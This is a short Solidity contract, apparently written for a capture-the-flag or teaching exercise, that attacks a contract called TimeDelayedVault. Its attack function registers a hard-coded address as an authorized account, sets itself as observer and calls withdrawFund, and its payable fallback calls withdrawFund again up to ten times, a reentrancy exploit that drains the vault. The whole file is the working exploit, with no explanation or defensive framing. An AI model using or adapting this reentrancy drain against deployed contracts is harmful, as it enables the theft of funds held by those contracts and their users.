contract SuperJ {
    uint public stack = 0;
    TimeDelayedVault timeDelay;
    address proposedAAA = 0x3399A1474E67f0baEcB288874a044CCfBA1f407B;

    function SuperJ(address timeDelayAddress) {
        timeDelay = TimeDelayedVault(timeDelayAddress);
    }
    
    function attack(uint index) {
        timeDelay.addAuthorizedAccount(index, proposedAAA);
        timeDelay.setObserver(this);
        timeDelay.withdrawFund();
    }
    
    function() payable {
        if (stack++ < 10) {
            timeDelay.withdrawFund();
        }
    }
} 